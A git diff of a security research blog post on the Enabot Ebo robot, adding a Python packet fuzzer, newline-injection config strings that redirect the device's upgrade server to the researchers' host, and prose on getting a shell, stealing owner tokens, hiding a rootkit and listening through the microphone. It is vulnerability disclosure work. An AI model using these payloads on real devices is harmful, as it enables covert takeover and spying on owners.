@@ -165,7 +165,7 @@ To get these we simply used GEF's built in unicorn-emulate, as they already had 
 
 Once we had the memory dump and registers, we needed to use an emulator. For this we decided to use [qiling](https://github.com/qilingframework/qiling). We liked that it would at least try to emulate some of the syscalls for us that we were bound to hit during this experiment. 
 
-So once we load the state into qiling and run the emulation to the end of the packet parsing function everything should just work right? Absolutely not! The first problem we were running into were functions that  With malloc, we ran into issues with it trying to do stuff with pthread functions, like pthread_mutex_lock. It would try to read from an address at a very high address that wasn't mapped, like `0xfffffbf0`. We weren't sure what this was doing, so we ended up using hooks to bypass these. So we ended up using unicorn's simple heap implementation instead inside of our hooks. This has disadvantages obviously, like we are no longer using the real malloc implementation, but we just kept going forward.
+So once we load the state into qiling and run the emulation to the end of the packet parsing function everything should just work right? Absolutely not! The first problem we were running into were functions that used malloc. We also ran into issues with it trying to do stuff with pthread functions, like pthread_mutex_lock. It would try to read from an address at a very high address that wasn't mapped, like `0xfffffbf0`. We weren't sure what this was doing, so we ended up using hooks to bypass these. So we ended up using unicorn's simple heap implementation instead inside of our hooks. This has disadvantages obviously, like we are no longer using the real malloc implementation, but we just kept going forward.
 
 > TODO: insert image of hooks
 
@@ -192,9 +192,9 @@ with trace_utils.collect_trace(ql, "tenet", f"trace3/{args.trace_name}"):
 
 We had eumulated fuzzing working, but even though the speed is amazing with the number of executions per second. We can only achieve so much coverage with it since the function we were emulating was also modifying things in other threads which we weren't able to emulate.
 
-This is where dumb fuzzing on the device came into play. We can spam the actual device with random packets and then also have gdb running on the device to catch if it crashes. We could also get the device into a state we wanted before sending the fuzzed packets. This would then allow us to fuzz whatever we want on the device, even though it would be much slower. Using this method we found various crashes, but none of them ended being exploitable.
+This is where dumb fuzzing on the device came into play. We can spam the actual device with random packets and then also have gdb running on the device to catch if it crashes. We could also get the device into a state we wanted before sending the fuzzed packets. This would then allow us to fuzz whatever we want on the device, even though it would be much slower.
 
-Our initial fuzzing was setup to just spam the device with random data and see if anything crashed the device, the fuzzer didn't end up finding anything, so we took a new approach.
+Our initial fuzzing was setup to just spam the device with random data and see if anything crashed the device. The fuzzer didn't end up finding anything because just choosing completely random data isn't gonna allow us to maneuver through the device's code to get a bunch of coverage.
 
 We then set it up so it sent the initial connection packet so that it knew a device was connected, even if it wasn't authenticated for the server. Then we sent fuzzed packets while the device was in this state, but we modified the specific branch value in the handle decrypted packet so that it would hit as many different branches in that function as possible, along with it hitting even more since it was connected.
 
@@ -202,13 +202,69 @@ We then set it up so it sent the initial connection packet so that it knew a dev
 
 The image above is the function that will take the packet after it has been unscrambled, and branch into these different section of code based on the initial branch value. So we would generate a completely random fuzzed packet, modify the branch value, adjust the size, and send the packet
 
-# Static Analysis
+Below is loop for our dumb fuzzer.
 
-- it was really just getting the mavlink packets to work. other than that we did the bounds checking for what is the max length of a packet?
+```python
+while True:
+    branch = ptypes[randint(0,len(ptypes)-1)]
+    # Grab all data after the TUTK ID since we can fuzz that and the packets will always go through
+    fuzzed = fuzzer.fuzz(fuzzable)[16::]
+    size = len(fuzzed)
+    # Set size to length of fuzzed data. Packets above 0x588 are truncated
+    if size > 0x588:
+        size = 0x588
+        fuzzed = fuzzed[0:0x588]
+    sizebytes = struct.unpack("<H", struct.pack(">H", size))[0]
+    branchbytes = struct.unpack("<H", struct.pack(">H", branch))[0]
+    # Has to have 0402 in the 16 byte "header". Then the size has to line up with the specified size in the 4/5th bytes
+    rand1 = randint(0,0xffff)
+    rand2 = randint(0,0xffff)
+    rand3 = randint(0, 0xffffffffff)
+    header = bytes.fromhex((f"0402{rand1:04X}{sizebytes:04X}" + f"{rand2:04x}{branchbytes:04x}21{rand3:010x}"))
+    # Combine generated header and fuzzed data
+    payload = header+fuzzed
+    print(payload)
+    # Add to recent packets deque
+    packet_deque.append(payload)
+    try:
+        data = scramble(payload, host_ip, ebo_ip)
+    except:
+        print("FAILED TO SCRAMBLE PACKET!!!!!")
+        continue
+    print(data)
+    # Send it to the ebo
+    sock.sendto(data, (ebo_ip, 32761))
+    # Don't send them too fast
+    time.sleep(0.02)
+    # Ping the ebo
+    response = os.system("ping -c 1 " + ebo_ip)
+
+    # Check the ping response
+    if response != 0:
+        response = os.system("ping -c 1 " + ebo_ip)
+        if response != 0:
+            # Device crashed. Save all recent packets
+            print(ebo_ip, 'is down!')
+            print(f"Crashed on :{fuzzable}")
+            for i,element in enumerate(packet_deque):
+                with open(f"radamsa_crashes_2/crashes_{crash_num}_{i}.bin", "wb") as outfile:
+                    outfile.write(element)
+            crash_num+=1
+            # Wait for device to go back up
+            while True:
+                response = os.system("ping -c 1 " + ebo_ip)
+                if response == 0:
+                    break
+```
+The fuzzable variable was a sample packet that we grabbed and included the TUTK ID. We only fuzz after the token which is why it's indexed with "16::". We generate the header with some random values in it where the only requirement for the header is the 0x0402 and the 0x21 in it. Then we scramble the packet and send it on its way. We ping the device afterwards to verify it didn't crash. If a ping doesn't respond it's because the device crashed, and we save the last 50 packets we sent to a folder. That way we have a buffer in case there was a delay before the device crashed after receiving the crash packet.
+
+The biggest benefit of this fuzzer is that it was insanely simple and quick to write. The downfall is Aside from the branch values, it's up to chance to hit all the different code blocks aside from that.
+
+Using this method we did find a few vulnerabilities, but they were not exploitable. 
 
 # Vulnerabilites
 
-After fuzzing and finding a few unexploitable crashes. We noticed something interesting on the device that never came through in the log messages. The ```ebo.cfg``` file had been modified with a bunch of random data in it. Normally it should look like this
+After going through the crashes we found and being dissapointed we couldn't exploit them. We noticed something interesting on the device that never came through in the log messages. The ```ebo.cfg``` file had been modified with a bunch of random data in it. Normally it should look like this
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/orig_ebo_cfg.png" alt="ebocontrol" style="height: 50%; width:50%;"/></p>
 
@@ -222,7 +278,7 @@ Somehow we were completely overwriting and creating our own values in the ebo.cf
 <p style="text-align:center;"><img src="/assets/enabot_part3/upgrade_from_config.png" alt="ebocontrol" style="height: 70%; width:70%;"/></p>
 
 
-We can see that it's grabbing the ```server-domain``` parameter from the config as part of the handleUpgradeRequest function. This was perfect because if we could overwrite the config to point to own own server, we could also trigger an upgrade from one of the mavlink commands that we mentioned earlier in the fuzzing sections. This would allow us to send alot more input that it doesn't expect, and install a rootkit onto the device.
+We can see that it's grabbing the ```server-domain``` parameter from the config as part of the handleUpgradeRequest function. This was perfect because if we could overwrite the config to point to own own server, we could also trigger an upgrade from one of the mavlink commands that we mentioned earlier in the fuzzing sections. This would allow us to send alot more input that it doesn't expect, and install a rootkit onto the device if we could send it a fake download file.
 
 First, we had to figure out how to successfully overwrite the config. After some testing from our ebo server, we figured out that the mavlink branch that was overwriting config values as 0xe5. At a certain offset after the start of the mavlink branch, it would look for a string that it would use to add to the config. The format was supposed to be 
 
@@ -230,19 +286,19 @@ config_header-header_parameter. So say you wanted to add a time parameter to the
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/timezone_modify.png" alt="ebocontrol" style="height: 50%; width:50%;"/></p>
 
-We see that they use the time header and the timezone paramter to select what they want to change in the config though.They use the branch value 0xe2, but that was only allowing them to modify an already existing value with an integer, which wasn't going to work for us because we had to use a string. With the branch value 0xe5, we could add new config values, but not modify existing ones, and it still didn't let us send strings. We were able to get around this using newlines. We also found out that if we tried to add a duplicate entry to an already existing parameter, it would be placed below the original one, and wouldn't get used. We were able to get around all of this using newlines though.
+We see that they use the time header and the timezone paramter to select what they want to change in the config though.They use the branch value 0xe2, but that was only allowing them to modify an already existing value with an integer, which wasn't going to work for us because we had to use a string. With the branch value 0xe5, we could add new config values, but not modify existing ones, and it still didn't let us send strings. We also found out that if we tried to add a duplicate entry to an already existing parameter, it would be placed below the original one, and wouldn't get used. We were able to get around all of this using newlines though.
 
 The config file has no fancy format. It's just square brackets for the headers, and newlines and equals signs for the parameters. We were able to send the following string in the packet to modify the config.
 
-> "server-a = b\ndomain = 10.42.0.1\ncccccc"
+```server-a = b\ndomain = 10.42.0.1\ncccccc```
 
 First the specify the server header. Then we send ```a = b\n```. We found out that the parameters were being placed in alphabetical order, so by specifying a as the first parameter, it would be placed at the top of the server portion of the config. Then because of the newline, we can specify ```domain = 10.42.0.1\n```, which sets the server domain to point to our local ip where we can host own own server and gets placed on its own line in the config. Finally we end the string with random garbage characters. This allows a the line after the domain to eat up the = "value" portion that gets placed automatically, so in the config it becomes c = nan because we didn't pass a valid value to it.
 
 We send a config packet with that string, and a config packet with this string
 
-> "server-a = b\nprotocol = http\nccccc"
+```server-a = b\nprotocol = http\nccccc```
 
-This also lets us replace the https protocl with http since that changes the path of the execution slightly which will be explained in a bit.
+This also lets us replace the https protocol with http since that changes the path of the execution slightly which will be explained in a bit.
 
 After sending these packets, the config now looks like this.
 
@@ -254,14 +310,14 @@ Now for some reason even after sending an update it still uses the original conf
 <p style="text-align:center;"><img src="/assets/enabot_part3/post_reboot_config.png" alt="ebocontrol" style="height: 50%; width:50%;"/></p>
 
 
-Conviently one of the mavlink commands also can trigger a soft reboot where the device reboots silently. So we can modify the config, reboot the device, and when we trigger and update, it'll reach back to our server. At the time of writing this, we just realized they misspelled "protocol" in the config. It must default to use the port when they normally update. We could still overwrite it, but it isn't necessary as we still are getting http requests. In the next section we'll go over how we were able to exploit the device once it reached back to our server
+Conviently one of the mavlink commands also can trigger a soft reboot where the device reboots silently. So we can modify the config, reboot the device, and when we trigger and update, it'll reach back to our server. At the time of writing this, we just realized they misspelled "protocol" in the config. It must default to use the port when they normally update. We could still overwrite it, but it isn't necessary as we still are getting http requests. In the next section we'll go over how we were able to exploit the device once it reached back to our server once we had changed the config.
 
 
 
 
 # Exploitation
 
-To truly exploit this device, we also needed to get a shell on it. This way we could get a shell, steal the saved tokens paired with the user's phone for connecting to the remote server, install a rootkit, and then place the token back on the device without there being a trace of what happened. This way we could have a rootkit on the device where we could access it at anytime, be able to use the ebo server, etc. and the owner could still use the ebo from their phone.
+Ultimately we wanted a shell on the device. This way we could get a shell, steal the saved tokens paired with the user's phone for connecting to the remote server, install a rootkit, and then place the token back on the device without there being a trace of what happened. This way we could have a rootkit on the device where we could access it at anytime, be able to use the ebo server, etc. and the owner could still use the ebo from their phone.
 
 We'll go over the path of an upgrade to help better understand how we were able to exploit this vulnerability. First when we triggered an upgrade using the mavlink branch value ```0xcd```, we hit this section of the code where it enters handleUartUpgradeRequest.
 
@@ -506,8 +562,17 @@ Now we can add this to the rest of the exploit after we get our shell, and it wi
 
 # Full Exploit Chain
 
-Stealing the TUTK ID using arp spoofing
+Stealing the TUTK ID using ARP spoofing
 
+[![enabot](https://img.youtube.com/vi/F0D6iHDxa0U/0.jpg)](https://www.youtube.com/watch?v=F0D6iHDxa0U)
+
+Using the stolen TUTK ID to get a shell on the EBO with an exploit (We have multiple Ebo's so the TUTK ID is different in the following video)
+
+[![enabot](https://img.youtube.com/vi/ukVBCccegdo/0.jpg)](https://www.youtube.com/watch?v=ukVBCccegdo)
+
+Using the stolen token to fully control/listen/talk/record on the Ebo. Video from Part 2 of Ebo hacking where the token is contained in `run.sh`. We did not include audio but we could hear throgh it's microphone and talk through it's speaker.
+
+[![enabot](https://img.youtube.com/vi/LKxfrlR7m9s/0.jpg)](https://www.youtube.com/watch?v=LKxfrlR7m9s)
 
 
 # Submitting a CVE
